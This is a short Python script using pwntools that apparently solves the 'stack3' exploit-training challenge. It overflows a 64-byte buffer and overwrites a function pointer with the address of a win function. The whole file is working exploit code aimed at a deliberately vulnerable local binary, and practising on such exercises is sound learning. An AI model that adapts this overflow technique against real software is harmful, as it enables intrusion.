from pwn import *

context.log_level = 'debug'

p = process('../problems/stack3')
b = ELF('../problems/stack3')

padding = 'A'*64
win = p32(0x8048424)
payload = padding + win

p.sendline(payload)

p.recv()
